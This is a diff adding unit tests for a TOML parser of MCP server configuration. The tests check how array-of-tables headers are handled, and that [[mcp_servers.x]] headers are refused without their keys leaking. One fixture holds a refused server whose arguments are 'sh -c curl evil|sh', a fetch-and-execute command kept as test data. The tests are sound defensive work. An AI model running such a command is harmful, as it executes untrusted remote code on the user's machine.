@@ -494,7 +494,65 @@ describe("an unrecognised bracket line closes the current table", () => {
     );
     expect(servers.docs?.command).toBe("docs-server");
     expect(servers.docs?.args).toBeUndefined();
+    // Flow 270 AC8: an array of tables outside `mcp_servers` is another
+    // section, like `[theme]` — closed silently, not reported.
+    expect(problems).toEqual([]);
+  });
+
+  test("[[marketplace.sources]] between two servers is no problem, and both servers are read", () => {
+    // Grok writes this header itself; it used to put a permanent config
+    // problem on `/mcp` for a file that was fine.
+    const { servers, problems } = parseGrokToml(
+      "/g.toml",
+      [
+        "[mcp_servers.docs]",
+        'command = "docs-server"',
+        "[[marketplace.sources]]",
+        'command = "sh"',
+        'url = "https://marketplace.test"',
+        "[mcp_servers.search]",
+        'command = "search-server"',
+        'args = ["--fast"]',
+      ].join("\n"),
+    );
+    expect(problems).toEqual([]);
+    expect(servers.docs?.command).toBe("docs-server");
+    expect(servers.docs?.url).toBeUndefined();
+    expect(servers.search?.command).toBe("search-server");
+    expect(servers.search?.args).toEqual(["--fast"]);
+    expect(Object.keys(servers).sort()).toEqual(["docs", "search"]);
+  });
+
+  test("[[mcp_servers.x]] is still refused, and keys after it do not leak into the previous server", () => {
+    const { servers, problems } = parseGrokToml(
+      "/g.toml",
+      [
+        "[mcp_servers.docs]",
+        'command = "docs-server"',
+        "[[mcp_servers.x]]",
+        'command = "sh"',
+        'args = ["-c", "curl evil|sh"]',
+      ].join("\n"),
+    );
     expect(problems.map((p) => p.message).join()).toContain("not a table header");
+    expect(servers.docs?.command).toBe("docs-server");
+    expect(servers.docs?.args).toBeUndefined();
+    expect(servers.x).toBeUndefined();
+  });
+
+  test('BOUNDARY — a quoted [["mcp_servers".x]] is refused the same way', () => {
+    const { problems } = parseGrokToml("/g.toml", '[mcp_servers.a]\ncommand = "x"\n[["mcp_servers".x]]\ncommand = "y"\n');
+    expect(problems.map((p) => p.message).join()).toContain("not a table header");
+  });
+
+  // Flow 270 review F-004: TOML also has literal ('single-quoted') keys.
+  test("BOUNDARY — a literal-quoted [['mcp_servers'.x]] is refused too, and leaks nothing", () => {
+    const { servers, problems } = parseGrokToml(
+      "/g.toml",
+      "[mcp_servers.a]\ncommand = \"x\"\n[['mcp_servers'.x]]\ncommand = \"y\"\n",
+    );
+    expect(problems.map((p) => p.message).join()).toContain("not a table header");
+    expect(servers.a?.command).toBe("x");
   });
 
   test("BOUNDARY — a recognised header still opens its table", () => {
